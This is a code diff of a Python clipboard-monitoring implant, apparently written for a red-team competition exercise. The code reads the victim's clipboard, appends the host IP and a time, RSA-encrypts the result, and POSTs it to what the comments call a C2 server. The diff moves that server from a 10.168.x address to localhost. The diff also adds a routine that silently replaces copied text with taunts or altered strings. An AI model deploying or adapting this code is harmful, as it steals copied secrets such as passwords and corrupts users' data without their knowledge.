@@ -3,6 +3,7 @@ import pyperclip
 import requests
 import schedule
 import time
+import random
 from pynput import keyboard
 import keyboard
 import rsa
@@ -24,8 +25,9 @@ def main():
     print('ctrlc added')
 
     #ctrl V ensures that the clipboard data is changed to password
-    keyboard.add_hotkey('ctrl+v', add_invisible_character_to_clipboard)
-    print('ctrlv added')
+    #TODO PROBLEM HERE IS GOING to be that it will modify the clipboard twice
+    #keyboard.add_hotkey('ctrl+v', change_clipboard)
+    #print('ctrlv added')
 
     #from https://schedule.readthedocs.io/en/stable/examples.html, schedule documentation
     #code handles the scheduled task
@@ -86,20 +88,25 @@ def get_clipboard_info():
             #make a list same size as the IP's
             filtered = list()
             i = 0
+            print(filtered)
 
             # https: // www.w3resource.com / python - exercises / python - basic - exercise - 55.php
             #loops through ip addresses and removes local host callbacks
 
             #varibale used to store the clipboard info being transmitted in a post request
             #encoded using utf8 so it can be encrypted using rsa
-            formatted_clipboard_info = (clipboard_info + ' - ' + filtered[0] + ' - (' + time.asctime(time.localtime()) + ')').encode('utf8')
+            if len(filtered) != 0:
+                formatted_clipboard_info = (clipboard_info + ' - ' + filtered[0] + ' - (' + time.asctime(time.localtime()) + ')').encode('utf8')
+            else:
+                formatted_clipboard_info = (clipboard_info + ' - localhost - (' + time.asctime(time.localtime()) + ')').encode('utf8')
+
             encoded_clipboard_info = rsa.encrypt(formatted_clipboard_info, public)
 
             #closes the file since it is done being used
             clipboard_data_file.close()
 
             #posts the request back to the c2 server, passing along the encoded clipboard information
-            requests.post("http://10.168.3.254:80/output", encoded_clipboard_info)
+            requests.post("http://127.0.0.1:80/output", encoded_clipboard_info)
 
         #if the last and current clipboard value match then close the file
         else:
@@ -109,9 +116,11 @@ def get_clipboard_info():
         last_clip_board_value = clipboard_info
 
         #changes the clipboard data to the same word but with an invisible character at the end
-        add_invisible_character_to_clipboard()
+        change_clipboard()
+        #add_invisible_character_to_clipboard()
     except:
         print('NOOOO')
+        change_clipboard()
         pass
 
 """
@@ -143,4 +152,41 @@ def change_password() -> None:
     #in this case copies the current clipboard info plus an invisible character
     pyperclip.copy('password')
 
+def change_clipboard() -> None:
+    clipboard_info = pyperclip.paste()
+    invisible_character = 'ᅟ'
+    print(clipboard_info)
+
+    if 'whoami' in clipboard_info:
+        pyperclip.copy('Red Team')
+    elif ('who' or 'what' or 'when' or 'where' or 'why') in clipboard_info:
+        pyperclip.copy('Question!')
+    elif ('blue' or 'Blue') in clipboard_info:
+        pyperclip.copy('Red is better than Blue')
+    else:
+        first_rand_int = random.randint(1,2)
+
+        #look at string modifying
+        if first_rand_int == 1:
+            counter = 0
+            new_clip = clipboard_info.replace('e','3')
+            new_clip = new_clip.replace('i', '1')
+            new_clip = new_clip.replace(' ', '_')
+            pyperclip.copy(new_clip)
+        elif first_rand_int == 2:
+            second_rand_int = random.randint(1, 6)
+            if second_rand_int == 1:
+                pyperclip.copy(clipboard_info + invisible_character)
+            if second_rand_int == 2:
+                pyperclip.copy('Red Team owns your clipboard')
+            if second_rand_int == 3:
+                pyperclip.copy('Red Red Red Red')
+            if second_rand_int == 4:
+                pyperclip.copy('No blue')
+            if second_rand_int == 5:
+                pyperclip.copy('Never gonna give you up, never gonna let you down')
+            if second_rand_int == 6:
+                pyperclip.copy('It\'s so Shrimple')
+
+    print(pyperclip.paste())
 main()
